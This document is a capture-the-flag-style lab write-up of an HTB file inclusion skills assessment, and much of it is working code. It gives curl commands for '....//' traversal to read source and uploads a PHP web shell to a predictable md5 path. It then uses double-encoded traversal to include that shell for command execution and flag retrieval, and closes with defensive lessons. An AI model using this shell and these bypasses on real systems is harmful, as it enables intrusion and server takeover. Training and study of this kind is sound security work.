# Section 11 — File Inclusion Skills Assessment

**Scenario:** Sumace Consulting GmbH — new job application form is the new attack surface. Find RCE, read flag in `/`.

**Target:** `154.57.164.83:31252`

---

## Reconnaissance

```
/                 → landing page
/apply.php        → job application form (multipart/form-data → /api/application.php)
/contact.php      → contact page (has region parameter — LFI!)
/api/image.php    → image lookup by hash (file_get_contents — read-only)
/api/application.php → upload handler
/uploads/         → upload destination
```

---

## Vulnerability Map (from source via image.php LFI)

### `/api/image.php` — LFI (read-only)
```php
$path = "../images/" . str_replace("../", "", $_GET["p"]);
$contents = file_get_contents($path);
```
- Non-recursive `str_replace('../', '', ...)` → `....//` bypass
- `file_get_contents` = **read-only** (no PHP execution)
- Use this to disclose source code

### `/api/application.php` — Upload Handler
```php
$ext = end((explode(".", $file_name)));
$target_file = "../uploads/" . md5_file($tmp_name) . "." . $ext;
move_uploaded_file($tmp_name, $target_file);
```
- **No extension whitelist** — `.php` accepted
- Final path: `/var/www/html/uploads/<md5_of_content>.<original_ext>`
- Predictable: I control content → I know the md5 → I know the path

### `/contact.php` — LFI (execute via include)
```php
if (isset($_GET["region"])) {
    if (str_contains($_GET["region"], ".") || str_contains($_GET["region"], "/")) {
        echo "'region' parameter contains invalid character(s)";
        $danger = true;
    } else {
        $region = urldecode($_GET["region"]);  // ← decode AFTER check
    }
}
if (!$danger) {
    include "./regions/" . $region . ".php";    // ← execute sink
}
```
- Check runs on **raw** input → blocks literal `.` and `/`
- `urldecode()` runs **after** check → `%2e` and `%2f` survive the filter
- **Double-encoding** needed because nginx/curl auto-decodes once before PHP

---

## Attack Chain

```
1. Upload PHP shell via /apply.php
   → stored at /var/www/html/uploads/<md5>.php
   → md5 is predictable (we control content)
2. Use contact.php region LFI with double-encoded ../
   → bypass filter → urldecode → include uploaded shell
3. Execute commands → find + read flag
```

---

## Exploitation

### Step 1 — Disclose source via image.php LFI

The `....//` bypass survives the non-recursive `../` strip:
```bash
# Read application.php to understand upload logic:
curl -sk "http://154.57.164.83:31252/api/image.php?p=....//....//....//....//....//var/www/html/api/application.php"

# Read contact.php to find execute sink:
curl -sk "http://154.57.164.83:31252/api/image.php?p=....//....//....//....//....//var/www/html/contact.php"
```

### Step 2 — Upload PHP shell

```bash
echo '<?php system($_GET["c"]); ?>' > /tmp/sh.php
SHELL_MD5=$(md5sum /tmp/sh.php | awk '{print $1}')
# SHELL_MD5=2fa910a7da2a26e8eb8fefb712150cd0

curl -sk -X POST "http://154.57.164.83:31252/api/application.php" \
  -F "firstName=A" -F "lastName=B" -F "email=a@b.c" \
  -F "file=@/tmp/sh.php;filename=sh.php"
# Stored at: /var/www/html/uploads/2fa910a7da2a26e8eb8fefb712150cd0.php
```

### Step 3 — RCE via double-encoded contact.php LFI

```bash
# Target: include /var/www/html/uploads/<md5>.php
# After contact.php's logic:
#   include "./regions/" . $region . ".php"
# Need $region = "../uploads/<md5>" (no .php — it's appended)
#
# Single-encoding (%2e, %2f) gets decoded by nginx → fails filter check
# Double-encoding (%252e, %252f) survives nginx → PHP urldecode → works

SHELL_MD5="2fa910a7da2a26e8eb8fefb712150cd0"
REGION="%252e%252e%252fuploads%252f${SHELL_MD5}"
# Decodes step 1 (nginx): %2e%2e%2fuploads%2f<md5>
# Filter sees: %2e%2e%2fuploads%2f<md5>  (no . or / — passes!)
# urldecode (PHP): ../uploads/<md5>
# include: ./regions/../uploads/<md5>.php = /var/www/html/uploads/<md5>.php ✓

curl -sk "http://154.57.164.83:31252/contact.php?region=${REGION}&c=id"
# → uid=33(www-data) gid=33(www-data)
```

### Step 4 — Find + read flag

```bash
# ls / reveals randomized flag name
curl -sk "http://154.57.164.83:31252/contact.php?region=${REGION}&c=ls+%2F"
# → flag_09ebca.txt

# Read it
curl -sk "http://154.57.164.83:31252/contact.php?region=${REGION}&c=cat+%2Fflag_09ebca.txt"
# → eedbb78d4800aa45573840ed6bd2d1e3
```

**Flag:** `eedbb78d4800aa45573840ed6bd2d1e3`

---

## Full Attack Chain Summary

```
Recon                 → /apply.php (file upload), /contact.php (region param), /api/image.php (LFI)
Source disclosure     → image.php?p=....//....//....//var/www/html/<path>  (file_get_contents read)
Identify weaknesses   → application.php stores at <md5>.<ext>; contact.php urldecodes AFTER filter
Upload PHP shell      → /uploads/<md5>.php
Bypass filter         → double-encode dots/slashes (%252e, %252f)
Trigger RCE           → contact.php?region=%252e%252e%252fuploads%252f<md5>&c=...
Read flag             → cat /flag_*.txt
```

---

## Lessons Learned

1. **Read-only LFI is still extremely useful** — image.php's `file_get_contents` couldn't execute PHP, but it disclosed every source file we needed to find the real RCE sink
2. **Filter ordering matters** — checking the raw param then decoding is a classic defense bug. The check and the sink must see the same string.
3. **Predictable upload paths** — `md5(content) + original_extension` is deterministic if you control input. The hash is no defense if the attacker uploads the file themselves.
4. **Combined LFI + Upload** — each alone is "just" a vuln; together they're RCE. Test all three (upload, file inclusion, source disclosure) on every assessment.
5. **Double-encoding** — when a filter and a decode are layered, double-encoding lets your payload survive the filter and arrive intact at the decoder.

---

## Exam Notes

- Always probe for **multiple LFI sinks** — read-only sinks let you grab source, find an execute sink elsewhere
- `....//` is the canonical non-recursive-strip bypass — memorize as one literal pattern
- Filter-before-decode is the #1 LFI bypass pattern in CTFs and real apps — look for ordering bugs in any param→include chain
- Double URL encoding (`%252e` for `.`, `%252f` for `/`) bypasses naive deny lists when the decoder runs after the check
- `md5(content)` upload naming is reversible when YOU upload — calculate locally with `md5sum`
- This assessment combined three of the module's techniques (LFI read, file upload, LFI bypass) — expect the CPTS exam to chain multiple vulns the same way

## Sources

- [devamydesai — HTB File Inclusion Sumace Skills Assessment](https://devamydesai.medium.com/htb-file-inclusion-skills-assessment-write-up-sumace-consulting-50f52293983e)
- [pred07 — CPTS Walkthrough: File Inclusion](https://github.com/pred07/CPTS-Walkthrough/blob/main/HTB-Academy/27.%20File%20Inclusion.md)
